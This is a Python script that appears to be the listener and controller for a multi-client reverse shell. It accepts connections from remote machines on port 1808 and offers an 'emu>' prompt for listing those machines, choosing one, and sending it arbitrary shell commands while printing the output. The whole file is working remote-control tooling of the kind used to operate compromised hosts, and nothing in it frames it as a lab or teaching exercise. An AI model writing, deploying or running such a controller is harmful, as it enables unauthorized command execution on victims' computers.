import socket
import threading
from queue import Queue

global s
THREADS = 2
THREAD_NUMBERS = [1, 2]
all_connections = []  # Store all accepted connections.
all_addresses = []  # Store all addresses.
q = Queue()
host = socket.gethostname()  # Get the host computer name.
port = 1808  # Enter a four digit port number.


def create_socket():
    global s
    s = socket.socket()  # Create a socket object.


def bind_socket():
    s.bind((host, port))  # Bind the host ip to the port 1708.
    print(f"{host} bound to port: {port}")
    s.listen(10)  # Listen to 10 incoming connections.


def accept_connections():
    """Accept and save incoming connections."""
    while True:  # Start an infinite loop.
        connection, address = s.accept()  # Accept connections.
        s.setblocking(True)
        #   Add the newly established connection to all_connections list.
        all_connections.append(connection)
        #   Add the newly established address to all_addresses list.
        all_addresses.append(address)
        print(f"A connection established: {address[0]}")  # Address[0] is the ip address.


#   The second thread.
def start_command_prompt():
    while True:
        command = input("emu>")
        if command == 'connections':
            list_all_connections()
        elif "connect" in command:
            connection = get_target_connection(command)
            if connection is not None:
                send_commands(connection)
        else:
            print("Invalid command.")


def list_all_connections():
    """List all connections."""
    for index, connection in enumerate(all_connections):
        try:
            connection.send(str.encode(" "))
            connection.recv(20480)
        except ConnectionResetError:
            del all_connections[index]
            del all_addresses[index]
            continue
        print(f"{index} : {all_addresses[index][0]}")


def get_target_connection(command):
    """Connect to selected target."""
    target_connection = command.replace('connect ', '')
    target_connection = int(target_connection)
    connection = all_connections[target_connection]
    print(f"You are connected to {all_addresses[target_connection][0]}")
    print(f"Enter a cmd command > ", end="")
    return connection


def send_commands(connection):
    """Send commands."""
    while True:
        command = input()
        if command == "exit":
            break
        if len(str.encode(command)) > 0:
            connection.send(str.encode(command))
            response = str(connection.recv(20480), "utf-8")
            print(response, end="")


def create_threads():
    for _ in range(THREADS):
        thread = threading.Thread(target=thread_jobs)
        thread.daemon = True
        thread.start()


def thread_jobs():
    while True:
        task = q.get()
        if task == 1:
            create_socket()
            bind_socket()
            accept_connections()
        if task == 2:
            start_command_prompt()
        q.task_done()


def queue_jobs():
    for thread_number in THREAD_NUMBERS:
        q.put(thread_number)
    q.join()


create_threads()
queue_jobs()
